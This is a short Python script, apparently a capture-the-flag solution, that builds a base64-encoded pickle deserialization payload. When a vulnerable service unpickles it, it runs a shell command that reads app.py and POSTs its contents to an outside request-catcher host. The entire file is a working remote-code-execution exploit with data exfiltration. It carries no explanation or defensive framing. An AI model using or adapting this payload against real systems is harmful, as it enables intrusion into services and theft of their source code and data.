import pickle
import base64

class PickleRCE(object):
    def __reduce__(self):
        import os
        return (os.system, (command,))

command = (
    'python3 -c "import http.client, json, subprocess; '
    'output = subprocess.check_output([\'cat\', \'app.py\']).decode(); '
    'conn = http.client.HTTPSConnection(\'huntressctf.requestcatcher.com\'); '
    'headers = {\'Content-type\': \'application/json\'}; '
    'payload = json.dumps({\'data\': output}); '
    'conn.request(\'POST\', \'/test\', payload, headers); '
    'response = conn.getresponse(); '
    'print(response.read().decode())"'
)

payload = base64.b64encode(pickle.dumps(PickleRCE())).decode()
print(payload)